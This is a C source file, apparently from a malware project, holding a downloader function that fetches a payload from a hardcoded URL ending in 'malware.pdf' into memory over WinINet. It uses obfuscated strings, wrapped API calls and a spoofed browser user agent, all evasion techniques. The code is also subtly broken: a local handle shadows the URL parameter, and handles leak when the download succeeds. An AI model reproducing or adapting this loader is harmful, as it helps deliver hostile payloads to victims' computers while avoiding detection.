#include "xDownload.h"

#include "xBuffer.h"
#include "xOsApi.h"



#define X_PAYLOAD_URL			X_OBFUSCATED_STRING_W(L"https://ioc.ninja/malware.pdf")
#define X_PAYLOAD_CHUNK_SIZE	1024


bool xDownloadToBuffer(const wchar_t* url, uint8_t** buffer, size_t* size)
{
	if (!url || !buffer || !size)
	{
		return false;
	}

	HINTERNET open = X_WININET_CALL(InternetOpen)(X_OBFUSCATED_STRING_W(L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (open)
	{
		HINTERNET url = X_WININET_CALL(InternetOpenUrl)(open, X_PAYLOAD_URL, NULL, 0, INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_COOKIES | INTERNET_FLAG_NO_UI, 0);

		if (url)
		{
			uint8_t s2pChunk[X_PAYLOAD_CHUNK_SIZE];

			DWORD s2pChunkSize = 0;

			xBuffer temp;

			while(X_WININET_CALL(InternetReadFile)(url, s2pChunk, X_PAYLOAD_CHUNK_SIZE, &s2pChunkSize) && s2pChunkSize)
			{
				temp.Add(s2pChunk, s2pChunkSize);
			}

			if (temp.GetSize())
			{			
				return temp.Copy(buffer, size);
			}

			X_WININET_CALL(InternetCloseHandle)(url);
		}

		X_WININET_CALL(InternetCloseHandle)(open);
	}

	return false;
}